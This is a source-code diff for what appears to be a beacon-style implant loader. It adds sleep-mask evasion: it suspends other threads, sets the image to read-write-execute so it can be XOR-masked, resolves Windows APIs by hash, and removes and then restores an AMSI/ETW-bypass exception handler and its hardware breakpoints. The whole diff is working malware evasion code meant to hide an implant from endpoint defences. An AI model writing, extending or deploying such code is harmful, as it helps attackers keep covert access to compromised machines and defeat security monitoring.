@@ -181,6 +181,116 @@ struct sm_function_call {
 
 typedef void (*sm_entry_fn)( sm_beacon_info*, sm_function_call* );
 
+#ifndef TH32CS_SNAPTHREAD
+#define TH32CS_SNAPTHREAD 0x00000004
+#endif
+
+struct sm_threadentry32 {
+    DWORD dwSize;
+    DWORD cntUsage;
+    DWORD th32ThreadID;
+    DWORD th32OwnerProcessID;
+    LONG  tpBasePri;
+    LONG  tpDeltaPri;
+    DWORD dwFlags;
+};
+
+typedef HANDLE (WINAPI *fn_sm_CreateToolhelp32Snapshot)( DWORD, DWORD );
+typedef BOOL   (WINAPI *fn_sm_Thread32First)( HANDLE, sm_threadentry32* );
+typedef BOOL   (WINAPI *fn_sm_Thread32Next)( HANDLE, sm_threadentry32* );
+typedef HANDLE (WINAPI *fn_sm_OpenThread)( DWORD, BOOL, DWORD );
+typedef DWORD  (WINAPI *fn_sm_SuspendThread)( HANDLE );
+typedef DWORD  (WINAPI *fn_sm_ResumeThread)( HANDLE );
+typedef SIZE_T (WINAPI *fn_sm_VirtualQuery)( LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T );
+
+static auto declfn sm_suspend_threads( instance& inst ) -> void {
+    auto pSnap    = reinterpret_cast<fn_sm_CreateToolhelp32Snapshot>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
+    auto pFirst   = reinterpret_cast<fn_sm_Thread32First>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
+    auto pNext    = reinterpret_cast<fn_sm_Thread32Next>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
+    auto pOpen    = reinterpret_cast<fn_sm_OpenThread>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
+    auto pSuspend = reinterpret_cast<fn_sm_SuspendThread>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "SuspendThread" ) ) );
+
+    if ( !pSnap || !pFirst || !pNext || !pOpen || !pSuspend ) return;
+
+    DWORD pid = inst.kernel32.GetCurrentProcessId();
+    DWORD tid = RtlGetCurrentThreadId();
+
+    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
+    if ( snap == INVALID_HANDLE_VALUE ) return;
+
+    sm_threadentry32 te = {};
+    te.dwSize = sizeof( sm_threadentry32 );
+
+    if ( pFirst( snap, &te ) ) {
+        do {
+            if ( te.th32OwnerProcessID == pid && te.th32ThreadID != tid ) {
+                HANDLE ht = pOpen( THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID );
+                if ( ht ) {
+                    pSuspend( ht );
+                    inst.kernel32.CloseHandle( ht );
+                }
+            }
+        } while ( pNext( snap, &te ) );
+    }
+    inst.kernel32.CloseHandle( snap );
+}
+
+static auto declfn sm_resume_threads( instance& inst ) -> void {
+    auto pSnap   = reinterpret_cast<fn_sm_CreateToolhelp32Snapshot>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
+    auto pFirst  = reinterpret_cast<fn_sm_Thread32First>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
+    auto pNext   = reinterpret_cast<fn_sm_Thread32Next>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
+    auto pOpen   = reinterpret_cast<fn_sm_OpenThread>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
+    auto pResume = reinterpret_cast<fn_sm_ResumeThread>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "ResumeThread" ) ) );
+
+    if ( !pSnap || !pFirst || !pNext || !pOpen || !pResume ) return;
+
+    DWORD pid = inst.kernel32.GetCurrentProcessId();
+    DWORD tid = RtlGetCurrentThreadId();
+
+    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
+    if ( snap == INVALID_HANDLE_VALUE ) return;
+
+    sm_threadentry32 te = {};
+    te.dwSize = sizeof( sm_threadentry32 );
+
+    if ( pFirst( snap, &te ) ) {
+        do {
+            if ( te.th32OwnerProcessID == pid && te.th32ThreadID != tid ) {
+                HANDLE ht = pOpen( THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID );
+                if ( ht ) {
+                    pResume( ht );
+                    inst.kernel32.CloseHandle( ht );
+                }
+            }
+        } while ( pNext( snap, &te ) );
+    }
+    inst.kernel32.CloseHandle( snap );
+}
+
+static auto declfn sm_query_protection( instance& inst, PVOID addr ) -> DWORD {
+    auto pVQ = reinterpret_cast<fn_sm_VirtualQuery>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "VirtualQuery" ) ) );
+    if ( !pVQ ) return PAGE_EXECUTE_READ;
+
+    MEMORY_BASIC_INFORMATION mbi = {};
+    if ( pVQ( addr, &mbi, sizeof( mbi ) ) == 0 ) return PAGE_EXECUTE_READ;
+    return mbi.Protect;
+}
+
+static BOOL __cdecl declfn sm_beacon_get_syscall_stub( void*, SIZE_T, BOOL ) {
+    return FALSE;
+}
+
 static auto declfn sm_resolve_symbol(
     instance& inst, const char* name
 ) -> void* {
@@ -214,10 +324,50 @@ static auto declfn sm_resolve_symbol(
             auto addr = inst.kernel32.GetProcAddress( h_mod, func_name );
             if ( addr ) return (void*)addr;
         }
+    } else {
+        uint32_t h = 2166136261u;
+        for ( const char* p = n; *p; p++ ) { h ^= (uint8_t)*p; h *= 16777619u; }
+        if ( h == expr::hash_string( "BeaconGetSyscallInformation" ) )
+            return (void*)sm_beacon_get_syscall_stub;
     }
 
     DBG_PRINT( inst, "sm_coff: unresolved: %s\n", name );
     return nullptr;
+}
+
+static auto declfn sm_compute_coff_text_size() -> uint32_t {
+    if ( SLEEPMASK_VS_COFF_SIZE < sizeof( COFF_FILE_HEADER ) )
+        return 0;
+
+    auto data = const_cast<uint8_t*>( SLEEPMASK_VS_COFF );
+    auto header = reinterpret_cast<COFF_FILE_HEADER*>( data );
+    auto sections = reinterpret_cast<COFF_SECTION*>(
+        data + sizeof( COFF_FILE_HEADER ) + header->SizeOfOptionalHeader );
+
+    uint32_t total = 0;
+    uint32_t text_end = 0;
+    uint16_t max_sec = header->NumberOfSections < 64 ? header->NumberOfSections : 64;
+
+    for ( uint16_t i = 0; i < max_sec; i++ ) {
+        uint32_t sz = sections[i].SizeOfRawData;
+        if ( sz == 0 ) sz = sections[i].VirtualSize;
+        if ( sz == 0 ) sz = 64;
+
+        if ( i > 0 && ( sections[i - 1].Characteristics & 0x20000000 ) &&
+             !( sections[i].Characteristics & 0x20000000 ) ) {
+            total = ( total + 0xFFF ) & ~0xFFFu;
+        }
+
+        uint32_t offset = total;
+        total += sz;
+
+        if ( sections[i].Characteristics & 0x20000000 ) {
+            uint32_t se = offset + sz;
+            if ( se > text_end ) text_end = se;
+        }
+    }
+
+    return text_end;
 }
 
 static auto declfn load_sleepmask_coff( instance& inst ) -> bool {
@@ -417,7 +567,8 @@ static auto declfn load_sleepmask_coff( instance& inst ) -> bool {
     inst.heap_free( section_ptrs );
     inst.heap_free( func_ptrs );
 
-    DBG_PRINT( inst, "sleepmask-vs: loaded, entry=%p, size=%u\n", entry_ptr, total_alloc );
+    DBG_PRINT( inst, "sleepmask-vs: loaded, entry=%p, text=%u, total=%u\n",
+        entry_ptr, sm_compute_coff_text_size(), total_alloc );
     return true;
 }
 
@@ -429,7 +580,7 @@ static auto declfn build_sm_beacon_info(
 
     info.version = 0x041200;
     info.sleep_mask_ptr = reinterpret_cast<char*>( inst.evasion.sleepmask_vs.code_base );
-    info.sleep_mask_text_size = inst.evasion.sleepmask_vs.code_size;
+    info.sleep_mask_text_size = sm_compute_coff_text_size();
     info.sleep_mask_total_size = inst.evasion.sleepmask_vs.code_size;
 
     if ( inst.evasion.ekko.initialized ) {
@@ -465,7 +616,9 @@ static auto declfn build_sm_beacon_info(
         sec.Label = 3; /* LABEL_TEXT */
         sec.BaseAddress = region.AllocationBase;
         sec.VirtualSize = region.RegionSize;
-        sec.CurrentProtect = PAGE_EXECUTE_READ;
+        DWORD prot = sm_query_protection( inst, region.AllocationBase );
+        sec.CurrentProtect  = prot;
+        sec.PreviousProtect = prot;
         sec.MaskSection = TRUE;
     }
 }
@@ -588,12 +741,85 @@ auto declfn evasion_udrl_sleep( instance& inst, uint32_t sleep_ms ) -> void {
 #endif
 }
 
+// VEH suspend/restore for sleepmask XOR safety.
+// The AMSI/ETW VEH handler lives inside the beacon image. When the sleepmask
+// COFF XORs the image, the handler becomes garbage - any exception during
+// sleep (e.g. a DR hardware breakpoint) causes infinite VEH recursion and an
+// ILLEGAL_INSTRUCTION crash. We clear hardware breakpoints and deregister the
+// VEH before the XOR, then restore both after the image is un-XORed.
+#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64) && \
+    defined(INCLUDE_EVASION_AMSI)
+
+struct sm_veh_state { PVOID handle; DWORD64 dr0, dr1, dr7; };
+
+static auto declfn sm_suspend_veh( instance& inst, sm_veh_state& s ) -> void {
+    s = {};
+    if ( !inst.evasion.amsi_veh ) return;
+    s.handle = inst.evasion.amsi_veh;
+
+    auto pNtGetCtx = reinterpret_cast<decltype(NtGetContextThread)*>(
+        resolve::_api( inst.ntdll.handle,
+            expr::hash_string( "NtGetContextThread" ) ) );
+    auto pNtSetCtx = reinterpret_cast<decltype(NtSetContextThread)*>(
+        resolve::_api( inst.ntdll.handle,
+            expr::hash_string( "NtSetContextThread" ) ) );
+
+    if ( pNtGetCtx && pNtSetCtx ) {
+        CONTEXT ctx = {};
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        pNtGetCtx( reinterpret_cast<HANDLE>( static_cast<LONG_PTR>(-2) ), &ctx );
+        s.dr0 = ctx.Dr0; s.dr1 = ctx.Dr1; s.dr7 = ctx.Dr7;
+        ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr7 = 0;
+        pNtSetCtx( reinterpret_cast<HANDLE>( static_cast<LONG_PTR>(-2) ), &ctx );
+    }
+
+    auto pRemoveVEH = reinterpret_cast<decltype(RtlRemoveVectoredExceptionHandler)*>(
+        resolve::_api( inst.ntdll.handle,
+            expr::hash_string( "RtlRemoveVectoredExceptionHandler" ) ) );
+    if ( pRemoveVEH ) pRemoveVEH( s.handle );
+    inst.evasion.amsi_veh = nullptr;
+}
+
+static auto declfn sm_restore_veh( instance& inst, const sm_veh_state& s ) -> void {
+    if ( !s.handle || !inst.evasion.amsi_veh_fn ) return;
+
+    auto pAddVEH = reinterpret_cast<decltype(RtlAddVectoredExceptionHandler)*>(
+        resolve::_api( inst.ntdll.handle,
+            expr::hash_string( "RtlAddVectoredExceptionHandler" ) ) );
+    if ( pAddVEH )
+        inst.evasion.amsi_veh = pAddVEH( 1,
+            reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>( inst.evasion.amsi_veh_fn ) );
+
+    auto pNtSetCtx = reinterpret_cast<decltype(NtSetContextThread)*>(
+        resolve::_api( inst.ntdll.handle,
+            expr::hash_string( "NtSetContextThread" ) ) );
+    if ( pNtSetCtx ) {
+        CONTEXT ctx = {};
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        ctx.Dr0 = s.dr0; ctx.Dr1 = s.dr1; ctx.Dr7 = s.dr7;
+        pNtSetCtx( reinterpret_cast<HANDLE>( static_cast<LONG_PTR>(-2) ), &ctx );
+    }
+}
+
+#endif
+
 auto declfn evasion_beacon_gate_call(
     instance& inst, void* fn_ptr, int win_api_id,
     int num_args, ULONG_PTR* args, bool mask
 ) -> ULONG_PTR {
 #if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
     if ( inst.evasion.sleepmask_vs.loaded && inst.evasion.sleepmask_vs.entry ) {
+#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+        sm_veh_state veh_state = {};
+#endif
+        DWORD pre_prot = 0;
+        if ( mask ) {
+            inst.kernel32.VirtualProtect(
+                reinterpret_cast<PVOID>( inst.base.address ),
+                inst.base.length,
+                PAGE_EXECUTE_READWRITE, &pre_prot );
+        }
+
         sm_beacon_info info;
         sm_heap_record sentinel;
         build_sm_beacon_info( inst, info, sentinel );
@@ -607,8 +833,38 @@ auto declfn evasion_beacon_gate_call(
         call.bMask   = mask ? TRUE : FALSE;
         call.retValue = 0;
 
+        DWORD coff_prot = 0;
+        if ( mask ) {
+            inst.kernel32.VirtualProtect(
+                inst.evasion.sleepmask_vs.code_base,
+                inst.evasion.sleepmask_vs.code_size,
+                PAGE_EXECUTE_READWRITE, &coff_prot );
+#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+            sm_suspend_veh( inst, veh_state );
+#endif
+            sm_suspend_threads( inst );
+        }
+
         auto fn = reinterpret_cast<sm_entry_fn>( inst.evasion.sleepmask_vs.entry );
         fn( &info, &call );
+
+        if ( mask ) {
+            DWORD coff_restore = 0;
+            inst.kernel32.VirtualProtect(
+                inst.evasion.sleepmask_vs.code_base,
+                inst.evasion.sleepmask_vs.code_size,
+                PAGE_EXECUTE_READ, &coff_restore );
+            DWORD post_prot = 0;
+            inst.kernel32.VirtualProtect(
+                reinterpret_cast<PVOID>( inst.base.address ),
+                inst.base.length,
+                PAGE_EXECUTE_READ, &post_prot );
+            sm_resume_threads( inst );
+#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+            sm_restore_veh( inst, veh_state );
+#endif
+        }
+
         return call.retValue;
     }
 #endif
@@ -636,6 +892,15 @@ auto declfn evasion_beacon_gate_call(
 auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> void {
 #if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
     if ( inst.evasion.sleepmask_vs.loaded && inst.evasion.sleepmask_vs.entry ) {
+#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+        sm_veh_state veh_state = {};
+#endif
+        DWORD pre_prot = 0;
+        inst.kernel32.VirtualProtect(
+            reinterpret_cast<PVOID>( inst.base.address ),
+            inst.base.length,
+            PAGE_EXECUTE_READWRITE, &pre_prot );
+
         sm_beacon_info info;
         sm_heap_record sentinel;
         build_sm_beacon_info( inst, info, sentinel );
@@ -649,8 +914,36 @@ auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> v
         call.bMask       = TRUE;
         call.retValue    = 0;
 
+        DWORD coff_prot = 0;
+        inst.kernel32.VirtualProtect(
+            inst.evasion.sleepmask_vs.code_base,
+            inst.evasion.sleepmask_vs.code_size,
+            PAGE_EXECUTE_READWRITE, &coff_prot );
+
+#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+        sm_suspend_veh( inst, veh_state );
+#endif
+        sm_suspend_threads( inst );
+
         auto fn = reinterpret_cast<sm_entry_fn>( inst.evasion.sleepmask_vs.entry );
         fn( &info, &call );
+
+        DWORD coff_restore = 0;
+        inst.kernel32.VirtualProtect(
+            inst.evasion.sleepmask_vs.code_base,
+            inst.evasion.sleepmask_vs.code_size,
+            PAGE_EXECUTE_READ, &coff_restore );
+
+        DWORD post_prot = 0;
+        inst.kernel32.VirtualProtect(
+            reinterpret_cast<PVOID>( inst.base.address ),
+            inst.base.length,
+            PAGE_EXECUTE_READ, &post_prot );
+
+        sm_resume_threads( inst );
+#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+        sm_restore_veh( inst, veh_state );
+#endif
 
         return;
     }
